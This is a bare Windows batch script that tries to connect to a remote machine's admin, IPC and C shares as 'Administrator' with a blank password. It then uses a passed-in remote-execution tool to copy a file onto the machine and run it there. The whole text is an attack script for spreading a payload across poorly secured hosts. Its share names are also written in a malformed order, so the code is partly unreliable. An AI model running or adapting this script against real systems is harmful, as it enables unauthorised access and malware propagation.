@echo off
set nu=net use
set send=-f -c -d %3 -o
set atr=attrib.exe -r %3
set do=-d %3 -o
%nu% %2\$admin "" /user:"Administrator"
%1 %2 %atr%
%1 %2 %send%
%1 %2 %do%
%nu% %2\$ipc "" /user:"Administrator"
%1 %2 %atr%
%1 %2 %send%
%1 %2 %do%
%nu% %2\$c "" /user:"Administrator"
%1 %2 %atr%
%1 %2 %send%
%1 %2 %do%